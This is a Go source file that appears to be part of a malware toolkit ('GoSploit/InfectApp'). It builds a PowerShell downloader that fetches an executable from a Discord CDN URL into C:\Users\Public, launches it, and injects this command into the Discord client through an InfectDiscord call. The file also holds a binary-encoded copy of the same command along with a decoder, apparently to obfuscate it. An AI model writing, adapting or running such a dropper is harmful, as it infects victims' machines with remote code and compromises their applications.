package main

import (
	"fmt"
	"strconv"

	"github.com/F-r-o-i-d/GoExF/GoExF/GoSploit/InfectApp"
)

func stringToBin(s string) (binString string) {
	for _, c := range s {
		binString = fmt.Sprintf("%s%b", binString, c)
	}
	return
}

func binToString(b string) (string, error) {
	var out string
	for i := 0; i < len(b); i += 8 {
		bb := b[i : i+8]
		n, err := strconv.ParseInt(bb, 2, 64)
		if err != nil {
			return "", err
		}
		out += string(n)
	}
	return out, nil
}

func main() {
	// GoSploit.Initialize()
	// GoSploit.StartUpWdirectories()
	cmd := "powershell -c (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1064471182730076220/1064471292411129886/main.exe', 'C:\\Users\\Public\\main.exe'); Start-Process C:\\Users\\Public\\main.exe"
	// cmd := "011100000110111101110111011001010111001001110011011010000110010101101100011011000010000000101101011000110010000000101000010011100110010101110111001011010100111101100010011010100110010101100011011101000010000001010011011110010111001101110100011001010110110100101110010011100110010101110100001011100101011101100101011000100100001101101100011010010110010101101110011101000010100100101110010001000110111101110111011011100110110001101111011000010110010001000110011010010110110001100101001010000010011101101000011101000111010001110000011100110011101000101111001011110110001101100100011011100010111001100100011010010111001101100011011011110111001001100100011000010111000001110000001011100110001101101111011011010010111101100001011101000111010001100001011000110110100001101101011001010110111001110100011100110010111100110001001100000011011000110100001101000011011100110001001100010011100000110010001101110011001100110000001100000011011100110110001100100011001000110000001011110011000100110000001101100011010000110100001101110011000100110010001110010011001000110100001100010011000100110001001100100011100100111000001110000011011000101111011011010110000101101001011011100010111001100101011110000110010100100111001011000010000000100111010000110011101001011100010111000101010101110011011001010111001001110011010111000101110001010000011101010110001001101100011010010110001101011100010111000110110101100001011010010110111000101110011001010111100001100101001001110010100100111011001000000101001101110100011000010111001001110100001011010101000001110010011011110110001101100101011100110111001100100000010000110011101001011100010111000101010101110011011001010111001001110011010111000101110001010000011101010110001001101100011010010110001101011100010111000110110101100001011010010110111000101110011001010111100001100101"
	// binary to string
	cmd, _ = binToString(cmd)
	InfectApp.InfectDiscord(cmd)

}